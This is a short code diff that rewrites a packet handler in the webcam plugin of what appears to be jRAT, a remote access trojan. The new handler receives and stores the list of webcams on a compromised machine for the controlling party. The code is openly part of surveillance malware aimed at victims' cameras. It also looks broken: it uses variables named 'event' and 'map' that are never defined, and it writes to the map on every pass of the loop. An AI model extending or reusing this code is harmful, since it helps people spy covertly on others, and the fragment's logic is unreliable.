@@ -1,20 +1,23 @@
 package se.jrat.plugin.webcam.client;
 
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
+import java.util.ArrayList;
+import java.util.List;
 
 import jrat.api.Client;
-import jrat.api.net.PacketBuilder;
+import jrat.api.net.PacketListener;
 
-public class Packet121ListWebcams extends PacketBuilder {
-
-	public Packet121ListWebcams(Client rat) {
-		super(WebcamPlugin.LIST_WEBCAM_HEADER, rat);
-	}
+public class Packet121ListWebcams extends PacketListener {
 
 	@Override
-	public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+	public void perform(Client client) {
+		int len = event.getServer().getDataReader().readInt();
 		
+		List<String> webcams = new ArrayList<String>();
+		
+		for (int i = 0; i < len; i++) {
+			webcams.add(WebcamPlugin.readString(event.getServer().getDataReader()));
+			map.put(event.getServer(), webcams);
+		}
 	}
 
 }
